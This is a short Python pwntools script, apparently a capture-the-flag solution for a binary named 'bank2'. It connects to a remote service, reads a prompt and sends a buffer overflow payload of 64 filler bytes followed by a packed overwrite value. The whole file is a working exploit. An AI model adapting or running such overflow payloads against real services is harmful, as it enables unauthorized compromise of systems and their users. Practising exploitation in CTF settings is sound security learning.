from pwn import *

io = remote('61.28.237.24', 30203)
#io = process('./bank2')

print(io.recvuntil(': '))
payload = b'A'*64+p32(0x66a44)
io.sendline(payload)
print(io.recvall())
